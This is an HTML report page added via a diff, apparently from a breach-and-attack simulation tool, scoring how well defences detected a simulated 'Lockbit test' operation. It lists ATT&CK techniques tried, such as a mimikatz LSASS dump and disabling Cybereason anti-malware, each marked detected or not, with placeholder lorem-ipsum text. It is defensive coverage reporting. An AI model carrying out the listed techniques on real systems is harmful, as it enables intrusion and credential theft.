@@ -1,0 +1,2397 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+     <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="Report_Example_PDF_files/bootstrap.min.css">
+<script src="Report_Example_PDF_files/jquery.min.js"></script>
+    <script src="Report_Example_PDF_files/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="Report_Example_PDF_files/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+    <title>Singularity</title>
+
+
+    <script src="Report_Example_PDF_files/jquery.terminal.min.js"></script>
+<link rel="stylesheet" href="Report_Example_PDF_files/jquery.terminal.min.css">
+</head>
+<body>
+
+<style>
+    @media (min-width: 1200px) {
+    .container{
+        max-width: 1280px;
+    }
+}
+
+</style>
+
+<style>
+
+.ham_navbar {
+  width: 35px;
+  height: 5px;
+  background-color: black;
+  margin: 6px 0;
+}
+.btn{
+    border-color: #9600FF;
+    }
+
+.sidebar {
+  height: 100%;
+  width: 0;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: black;
+  overflow-x: hidden;
+  transition: 0.5s;
+  padding-top: 60px;
+}
+
+.sidebar a {
+  padding: 8px 8px 8px 32px;
+  text-decoration: none;
+  font-size: 25px;
+  color: #818181;
+  display: block;
+  transition: 0.3s;
+}
+
+.sidebar a:hover {
+  color: #9600FF;
+}
+
+.sidebar .closebtn {
+  position: absolute;
+  top: 0;
+  right: 25px;
+  font-size: 36px;
+  margin-left: 50px;
+}
+
+.openbtn {
+  font-size: 20px;
+  cursor: pointer;
+  background-color: black;
+  color: white;
+  padding: 10px 15px;
+  border: none;
+}
+
+.openbtn:hover {
+  background-color: #444;
+}
+
+#main {
+  transition: margin-left .5s;
+  padding: 16px;
+  cursor: pointer;
+}
+
+/* On smaller screens, where height is less than 450px, change the style of the sidenav (less padding and a smaller font size) */
+@media screen and (max-height: 450px) {
+  .sidebar {padding-top: 15px;}
+  .sidebar a {font-size: 18px;}
+}
+</style>
+
+<div id="mySidebar" class="sidebar">
+  <a href="javascript:void(0)" class="closebtn" onclick="closeNav()" id="closemenu">×</a>
+  <a href="http://localhost:8000/drones">Drones</a>
+  <a href="http://localhost:8000/operations">Operations</a>
+  <a href="http://localhost:8000/workbench">Workbench</a>
+    <a href="http://localhost:8000/payloadGen">Implant Generator</a>
+  <a href="http://localhost:8000/eventHorizon">Event Horizon</a>
+  <a href="#">Settings</a>
+    
+    <div class="align-self-end mr-3 mx-auto d-block" style="padding-top: 200px; width:50%;">
+         
+    <img class="img-fluid mx-auto d-block" src="Report_Example_PDF_files/leonidas.png" alt="My image">
+    </div>
+</div>
+
+<div id="main">
+    <span class="float-right"><a href="http://localhost:8000/logout" style="color: #ffc250;">Logout</a> </span>
+    <span class="float-right" style="margin-right: 5px;">Hello, tferraz!</span>
+    <div class="row">
+    <button onclick="openNav()" class="btn btn-primary" style="background-color: white; width: 8%; border: 0px;" id="menubtn">
+    
+    <input type="image" style="cursor: pointer;float: top; width: 100%;" class="float-rigth" src="Report_Example_PDF_files/menu.png">
+    </button>
+        </div>
+</div>
+
+<script>
+function openNav() {
+  document.getElementById("mySidebar").style.width = "250px";
+  document.getElementById("main").style.marginLeft = "250px";
+}
+
+function closeNav() {
+  document.getElementById("mySidebar").style.width = "0";
+  document.getElementById("main").style.marginLeft= "0";
+}
+
+$('#closemenu').click(function(){
+    $('#menubtn').fadeIn('fast');
+});
+$('#menubtn').click(function(){
+    $('#menubtn').fadeOut(400);
+});
+</script>
+
+
+<script src="Report_Example_PDF_files/chart.js"></script>
+<script type="text/javascript" src="Report_Example_PDF_files/jspdf.min.js"></script>
+<script type="text/javascript" src="Report_Example_PDF_files/html2canvas.js"></script>
+<script>
+</script>
+<form id="deleteReport" method="POST" action="/deleteReport">
+    <input type="hidden" name="csrfmiddlewaretoken" value="MdbZUoR2a5C8kIQDdHr2qPOvJLbjxsmRx9AQsYZMMHQVxL7osKEl6otj1mCKxvdE">
+    <input name="id" value="146" hidden="hidden">
+</form>
+    <div class="container" align="center">
+        <button class="btn" type="submit" form="deleteReport">Delete</button>
+    </div>
+<div class="container html-content" id="printbox" style="padding: 70px;">
+    <div class="row" style="text-align: center; margin-bottom: 50px;margin-top: 30px;">
+        <h1 style="text-align: center;">Report for Lockbit test</h1>
+    </div>
+    <div class="row">
+        <h3>Operation Start: 08/28/2022, 13:59:25</h3>
+            </div>
+        <div class="row">
+        <h3>Operation End: 08/28/2022, 14:02:05</h3>
+    </div>
+    <hr>
+    
+    <div class="row">
+        <h2 style="color: #9600FF;">Executive Summary</h2>
+            </div>
+        <div class="row jumbotron">
+        <p class="lead" style="color: black;">"But I must explain to you
+ how all this mistaken idea of denouncing pleasure and praising pain was
+ born and I will give you a complete account of the system, and expound 
+the actual teachings of the great explorer of the truth, the 
+master-builder of human happiness. No one rejects, dislikes, or avoids 
+pleasure itself, because it is pleasure, but because those who do not 
+know how to pursue pleasure rationally encounter consequences that are 
+extremely painful. Nor again is there anyone who loves or pursues or 
+desires to obtain pain of itself, because it is pain, but because 
+occasionally circumstances occur in which toil and pain can procure him 
+some great pleasure. To take a trivial example, which of us ever 
+undertakes laborious physical exercise, except to obtain some advantage 
+from it? But who has any right to find fault with a man who chooses to 
+enjoy a pleasure that has no annoying consequences, or one who avoids a 
+pain that produces no resultant pleasure?"Lorem ipsum dolor sit amet, 
+consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore 
+et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud 
+exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. 
+Duis aute irure dolor in reprehenderit in voluptate velit esse cillum 
+dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non 
+proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
+    </div>
+    <hr>
+    
+        
+        <div class="row">
+            <h2 style="color: #9600FF;">Scorecard &amp; Metrics</h2>
+                        </div>
+    <div class="row jumbotron">
+        <div class="card">
+  <div class="card-body">
+    <h3 class="card-title">Score: F</h3>
+    <h5 class="card-subtitle mb-2 text-muted">Percentage Score: 45%</h5>
+    <h4>
+        When comparing to other simulations with the same attack scenario, you scored higher than
+  <small class="text-muted" style="color: #9600FF;">100%</small> of the test subjects.
+</h4>
+  </div>
+</div>
+    </div>
+    <div class="jumbotron">
+    <div class="row" style="margin-top: 15px;">
+        <div class="col-md-4">
+           <div class="card text-white bg-dark mb-3" style="max-width: 20rem; height: 200px;">
+  <div class="card-header">Recall</div>
+  <div class="card-body">
+    <h4 class="card-title">38%</h4>
+    <h6 class="card-text">Recall is how well you find malicious activity.</h6>
+  </div>
+</div>
+        </div>
+        <div class="col-md-4">
+           <div class="card text-white bg-dark mb-3" style="max-width: 20rem; height: 200px;">
+  <div class="card-header">Detection Rate</div>
+  <div class="card-body">
+    <h4 class="card-title">38%</h4>
+    <h6 class="card-text">Percentage of detected techniques.</h6>
+  </div>
+</div>
+        </div>
+                <div class="col-md-4">
+           <div class="card text-white bg-dark mb-3" style="max-width: 20rem; height: 200px;">
+  <div class="card-header">Block Rate</div>
+  <div class="card-body">
+    <h4 class="card-title">0%</h4>
+    <h6 class="card-text">Percentage of prevented techniques.</h6>
+  </div>
+</div>
+        </div>
+    </div>
+        <div class="row">
+            <div class="col-md-2"></div>
+            <div class="col-md-4" align="center">
+           <div class="card text-white bg-dark mb-3" style="max-width: 20rem; height: 200px;">
+  <div class="card-header">Improvement-Win Margin</div>
+  <div class="card-body">
+    <h4 class="card-title">25%</h4>
+    <h6 class="card-text">Attacks that you are currently logging but not detecting.</h6>
+</div>
+        </div>
+            </div>
+               <div class="col-md-4" align="center">
+           <div class="card text-white bg-dark mb-3" style="max-width: 20rem; height: 200px;">
+  <div class="card-header">Alert Quality</div>
+  <div class="card-body">
+    <h4 class="card-title">33%</h4>
+    <h6 class="card-text">Measures the alert and overall information quality.</h6>
+</div>
+        </div>
+            </div>
+        </div>
+        </div>
+    <hr>
+        
+    
+    <div class="jumbotron">
+    <div class="row">
+                    <h2 style="color: #9600FF;">Tactic Summary</h2>
+    </div>
+        <div class="row">
+            <canvas id="tacticSummary" style="display: block; box-sizing: border-box; height: 552.5px; width: 1105px;" width="884" height="442"></canvas>
+            <script>
+                var ctx = document.getElementById("tacticSummary").getContext("2d");
+                var data = {'labels': ['Reconnaissance', 'Resource Development', 'Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access', 'Discovery', 'Lateral Movement', 'Collection', 'Command and Control', 'Exfiltration', 'Impact'], 'datasets': [{'label': 'Executed', 'backgroundColor': '#952cc9', 'data': [0, 0, 1, 0, 3, 2, 2, 1, 3, 0, 0, 0, 0]}, {'label': 'Prevented', 'backgroundColor': '#021263', 'data': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]}, {'label': 'Detected', 'backgroundColor': '#00690a', 'data': [0, 0, 1, 0, 2, 1, 1, 0, 1, 0, 0, 0, 0]}, {'label': 'Logged', 'backgroundColor': '#d294ff', 'data': [0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0]}, {'label': 'Not Detected', 'backgroundColor': '#960505', 'data': [0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0]}]}
+                const tactics_Summary = new Chart(ctx, {
+                type: 'bar',
+                data: data,
+                options: {
+    plugins: {
+      title: {
+        display: true,
+        text: 'Tactic Summary'
+      },
+    },
+    responsive: true,
+    scales: {
+        y: {
+            display: true,
+            ticks: {
+                stepSize: 1,
+            }
+        },
+        x: {
+                    gridLines: {
+                offsetGridLines: true
+            }
+        }
+    }
+    }
+});
+
+            </script>
+
+        </div>
+         <div class="row" style="margin-top: 30px;" align="center">
+                         <canvas id="tacticSummaryRadar" style="display: block; box-sizing: border-box; height: 1105px; width: 1105px;" width="884" height="884"></canvas>
+             <script>
+                  var ctxRadarTactics = document.getElementById("tacticSummaryRadar").getContext("2d");
+                var dataRadarTactics = {'labels': ['Reconnaissance', 'Resource Development', 'Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion', 'Credential Access', 'Discovery', 'Lateral Movement', 'Collection', 'Command and Control', 'Exfiltration', 'Impact'], 'datasets': [{'label': 'Executed', 'backgroundColor': '#952cc9', 'data': [0, 0, 1, 0, 3, 2, 2, 1, 3, 0, 0, 0, 0]}, {'label': 'Prevented', 'backgroundColor': '#021263', 'data': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]}, {'label': 'Detected', 'backgroundColor': '#00690a', 'data': [0, 0, 1, 0, 2, 1, 1, 0, 1, 0, 0, 0, 0]}, {'label': 'Logged', 'backgroundColor': '#d294ff', 'data': [0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0]}, {'label': 'Not Detected', 'backgroundColor': '#960505', 'data': [0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0]}]}
+                const tactics_Summary_Radar = new Chart(ctxRadarTactics, {
+                type: 'radar',
+                data: dataRadarTactics,
+                options: {
+    responsive: true,
+    plugins: {
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart'
+      }
+    }
+  },
+  });
+             </script>
+         </div>
+    </div>
+    <hr>
+    
+    
+    <div class="jumbotron">
+        <div class="row">
+            <h2 style="color: #9600FF;">Tactic Drilldown</h2>
+        </div>
+        
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Resource Development</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1452" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1452 = document.getElementById("tacticDrilldown1452").getContext("2d");
+                var datatacticdrilldown1452 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [0], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [0], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [0], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1452 = new Chart(ctxtacticdrilldown1452, {
+                type: 'bar',
+                data: datatacticdrilldown1452,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Initial Access</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+            <tr class="table-dark">
+      <th scope="row">T1078.003 - Valid Accounts - Local Accounts </th>
+      <td>Add created user to admingroup</td>
+      <td>Detected</td>
+    </tr>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1453" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1453 = document.getElementById("tacticDrilldown1453").getContext("2d");
+                var datatacticdrilldown1453 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [1], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [1], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [0], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1453 = new Chart(ctxtacticdrilldown1453, {
+                type: 'bar',
+                data: datatacticdrilldown1453,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Execution</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1454" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1454 = document.getElementById("tacticDrilldown1454").getContext("2d");
+                var datatacticdrilldown1454 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [0], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [0], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [0], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1454 = new Chart(ctxtacticdrilldown1454, {
+                type: 'bar',
+                data: datatacticdrilldown1454,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Persistence</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+            <tr class="table-dark">
+      <th scope="row">T1136.001 - Create Account - Local Account </th>
+      <td>Create account </td>
+      <td>Detected</td>
+    </tr>
+        
+            <tr class="table-dark">
+      <th scope="row">T1078.003 - Valid Accounts - Local Accounts </th>
+      <td>Add created user to admingroup</td>
+      <td>Detected</td>
+    </tr>
+        
+            <tr class="table-dark">
+      <th scope="row">T1547.001 - Boot or Logon Autostart Execution - Registry Run Keys / Startup Folder </th>
+      <td>Leonidas Autorun</td>
+      <td>Not Detected</td>
+    </tr>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1455" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1455 = document.getElementById("tacticDrilldown1455").getContext("2d");
+                var datatacticdrilldown1455 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [3], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [2], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [1], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1455 = new Chart(ctxtacticdrilldown1455, {
+                type: 'bar',
+                data: datatacticdrilldown1455,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Privilege Escalation</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+            <tr class="table-dark">
+      <th scope="row">T1078.003 - Valid Accounts - Local Accounts </th>
+      <td>Add created user to admingroup</td>
+      <td>Detected</td>
+    </tr>
+        
+            <tr class="table-dark">
+      <th scope="row">T1547.001 - Boot or Logon Autostart Execution - Registry Run Keys / Startup Folder </th>
+      <td>Leonidas Autorun</td>
+      <td>Not Detected</td>
+    </tr>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1456" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1456 = document.getElementById("tacticDrilldown1456").getContext("2d");
+                var datatacticdrilldown1456 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [2], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [1], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [1], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1456 = new Chart(ctxtacticdrilldown1456, {
+                type: 'bar',
+                data: datatacticdrilldown1456,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Defense Evasion</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+            <tr class="table-dark">
+      <th scope="row">T1078.003 - Valid Accounts - Local Accounts </th>
+      <td>Add created user to admingroup</td>
+      <td>Detected</td>
+    </tr>
+        
+            <tr class="table-dark">
+      <th scope="row">T1562.001 - Impair Defenses - Disable or Modify Tools </th>
+      <td>Disable Cybereason Anti-malware</td>
+      <td>Not Detected</td>
+    </tr>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1457" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1457 = document.getElementById("tacticDrilldown1457").getContext("2d");
+                var datatacticdrilldown1457 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [2], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [1], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [1], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1457 = new Chart(ctxtacticdrilldown1457, {
+                type: 'bar',
+                data: datatacticdrilldown1457,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Credential Access</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+            <tr class="table-dark">
+      <th scope="row">T1003.001 - OS Credential Dumping - LSASS Memory </th>
+      <td>mimikatz dump</td>
+      <td>Not Detected</td>
+    </tr>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1458" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1458 = document.getElementById("tacticDrilldown1458").getContext("2d");
+                var datatacticdrilldown1458 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [1], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [0], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [1], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1458 = new Chart(ctxtacticdrilldown1458, {
+                type: 'bar',
+                data: datatacticdrilldown1458,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Reconnaissance</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1451" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1451 = document.getElementById("tacticDrilldown1451").getContext("2d");
+                var datatacticdrilldown1451 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [0], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [0], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [0], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [0], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1451 = new Chart(ctxtacticdrilldown1451, {
+                type: 'bar',
+                data: datatacticdrilldown1451,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Discovery</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+            <tr class="table-dark">
+      <th scope="row">T1033 - System Owner/User Discovery </th>
+      <td>whoami.exe</td>
+      <td>Logged</td>
+    </tr>
+        
+            <tr class="table-dark">
+      <th scope="row">T1087.001 - Account Discovery - Local Account </th>
+      <td>Local Accounts - net user</td>
+      <td>Detected</td>
+    </tr>
+        
+            <tr class="table-dark">
+      <th scope="row">T1057 - Process Discovery </th>
+      <td>Process Discovery - tasklist</td>
+      <td>Logged</td>
+    </tr>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
+              <canvas id="tacticDrilldown1459" style="display: block; box-sizing: border-box; height: 170px; width: 510px;" width="408" height="136"></canvas>
+              <script>
+                    var ctxtacticdrilldown1459 = document.getElementById("tacticDrilldown1459").getContext("2d");
+                var datatacticdrilldown1459 = {'labels': ['Tactic'], 'datasets': [{'label': 'Executed', 'data': [3], 'backgroundColor': '#952cc9'}, {'label': 'Logged', 'data': [2], 'backgroundColor': '#d294ff'}, {'label': 'Detected', 'data': [1], 'backgroundColor': '#00690a'}, {'label': 'Prevented', 'data': [0], 'backgroundColor': '#021263'}, {'label': 'Not Detected', 'data': [0], 'backgroundColor': '#960505'}]};
+                const graph_tacticdrilldown1459 = new Chart(ctxtacticdrilldown1459, {
+                type: 'bar',
+                data: datatacticdrilldown1459,
+                options: {
+    responsive: true,
+    plugins: {
+    legend: {
+        position: 'top',
+                        labels: {
+                    color: 'rgb(255, 255, 255)'
+                },
+        color: 'white',
+      },
+          scales: {
+      x: {
+        stacked: false,
+      },
+      y: {
+        stacked: false
+      }
+    },
+      title: {
+        display: true,
+        text: 'Tactic Radar Chart',
+        color: 'white',
+      }
+    }
+  },
+  });
+              </script>
+          </div>
+          </div>
+  </div>
+</div>
+        </div>
+                
+        <div class="row">
+<div class="card text-white bg-dark mb-3" style="width: 99%;float: center;">
+  <div class="card-header"><h4>Lateral Movement</h4></div>
+  <div class="card-body">
+      <div class="row">
+          <div class="col-md-6">
+              <table class="table table-hover">
+  <thead>
+    <tr style="color:white;">
+      <th scope="col">ID</th>
+      <th scope="col">Name</th>
+      <th scope="col">Status</th>
+    </tr>
+  </thead>
+  <tbody>
+        
+  </tbody>
+              </table>
+
+              </div>
+
+          <div class="col-md-6">
